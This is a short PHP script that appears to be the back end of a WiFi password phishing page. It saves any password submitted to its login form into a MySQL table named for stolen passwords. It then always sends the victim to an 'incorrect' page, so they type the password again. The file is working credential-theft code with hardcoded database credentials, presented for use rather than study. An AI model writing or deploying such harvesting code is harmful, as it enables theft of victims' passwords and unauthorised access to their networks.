<?php
// extracting password via adding sql record
$pdo = new PDO('mysql:host=localhost;dbname=password_db', "fox", "WiFiThief9876");

if(isset($_POST['log_in'])){ 
$password = $_POST['pass'];

$sql = "INSERT INTO password_table (password) VALUES (?)";
$pdo->prepare($sql)->execute([$password]);

}
header("Location: http://127.0.0.1:8080/wifipassword/index.php?incorrect=true");
exit;
?>
